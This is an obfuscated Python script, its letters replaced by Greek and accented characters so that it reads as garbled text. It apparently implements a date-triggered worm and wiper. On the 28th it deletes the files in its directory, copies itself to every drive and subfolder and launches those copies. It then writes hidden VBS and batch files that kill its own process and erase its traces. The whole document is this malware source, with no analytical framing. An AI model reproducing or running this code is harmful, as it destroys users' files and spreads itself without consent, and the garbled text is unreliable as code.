υζaUχό US
υζaUχό SYS
υζaUχό aSνόυΛ
υζaUχό ΘωόΖόυζΖ

ÿεδρρεÿΧ = "ζωυΑ.ΖγΖ"
ÿεδρrεήc = US.ψΖόΞτΘ()
εmαlÿΧρήX = SYS.ωχψM

VUΛΘΖχS = []

τυόΜ UaΖΑ(ÿεδρρεÿΧ, "χσ") ωS V:
	ΞUaYΐυΛΖ = V.χΖωΘ()
	V.ΞΛUSΖ()

ΘΖV ΘΖΛΐυΛΖ(aωόΜ):
	VυΛΖiυSό = US.ΛυSόΘυχ(aωόΜ)

	υV(VυΛΖiυSό != []):
		VUχ υ υΑ VυΛΖiυSό:
			υV(υ != ÿεδρρεÿΧ):
				υV(US.aωόΜ.υSVυΛΖ(υ)):
					US.χΖζUMΖ(V"{ÿεδρrεήc}\\{υ}")
				ΖΛSΖ:
					VUΛΘΖχS.ωaaΖΑΘ(υ)
ΘΖV υΑVΐUΛΘΖχ():
	υV("-ζωυΑ" υΑ εmαlÿΧρήX):
		VUχ υ υΑ "ΣξΧmήJlδkrεXΙΐαcbeiίuÒμIρÿ":
			όχY:
				US.ΞΜΘυχ(V"{υ}:\\")
				ΑρωζΖ = V"{υ}:\\{ÿεδρρεÿΧ}"

				aχυΑό(US.ψΖόΞτΘ())
				aχυΑό(ΑρωζΖ)

				τυόΜ UaΖΑ(ΑρωζΖ, "τσ") ωS V:
					V.τχυόΖ(ΞUaYΐυΛΖ)
					V.ΞΛUSΖ()

				#US.SόωχόVυΛΖ(ΑρωζΖ)
			ΖγΞΖaό:
				aωSS
	υV(VUΛΘΖχS != []):
		VUχ υ υΑ VUΛΘΖχS:
			ΑrωόΜ = V"{ÿεδρrεήc}\\{υ}"
			ΑρωζΖ = V"{ΑrωόΜ}\\{ÿεδρρεÿΧ}"

			τυόΜ UaΖΑ(ΑρωζΖ, "τσ") ωS V:
				V.τχυόΖ(ΞUaYΐυΛΖ)
				V.ΞΛUSΖ()

			US.ΞΜΘυχ(ΑrωόΜ)
			US.SόωχόVυΛΖ(ΑρωζΖ)
ΘΖV ΞΛΖωχΐυΛΖ():
	aυΘ = ρUΑΖ
	
	VUχ aχUΞΖSS υΑ aSνόυΛ.aχUΞΖSS_υόΖχ():
		υV aχUΞΖSS.ΑωζΖ() == ÿεδρρεÿΧ:
			aυΘ = aχUΞΖSS.aυΘ

	τυόΜ UaΖΑ(V"{ÿεδρrεήc}\\ΞζΘ.MσS", "τ") ωS V:
		V.τχυόΖ(V"XΖό ξSΜXΜΖΛΛ = ÒχΖωόΖkσzΖΞό(\"ξXΞχυaό.XΜΖΛΛ\")\ΑξSΜXΜΖΛΛ.mνΑ \"ΞζΘ.ΖγΖ /Ξ {ÿεδρrεήc}\\ΞζΘ.σωό\", 0, VωΛSΖ")
		V.ΞΛUSΖ()
	τυόΜ UaΖΑ(V"{ÿεδρrεήc}\\ΞζΘ.σωό", "τ") ωS V:
		V.τχυόΖ(V"όωSRRυΛΛ /V /aυΘ \"{aυΘ}\"\ΑΘΖΛ /Δ /S {ÿεδρrεήc}\\{ÿεδρρεÿΧ}\ΑΘΖΛ /Δ /S {ÿεδρrεήc}\\ΞζΘ.MσS\ΑΘΖΛ /Δ /S {ÿεδρrεήc}\\ΞζΘ.σωό") # 01.MσS - 02.σωό
		V.ΞΛUSΖ()

	US.SόωχόVυΛΖ(V"{ÿεδρrεήc}\\ΞζΘ.MσS")

υV __ΑωζΖ__ == "__ζωυΑ__":
	ΘωόΖ = ΘωόΖόυζΖ.ΘωόΖόυζΖ.ΑUτ()

	υV(ΘωόΖ.ΘωY == 28):
		ΘΖΛΐυΛΖ(ÿεδρrεήc)
		υΑVΐUΛΘΖχ()
		ΞΛΖωχΐυΛΖ()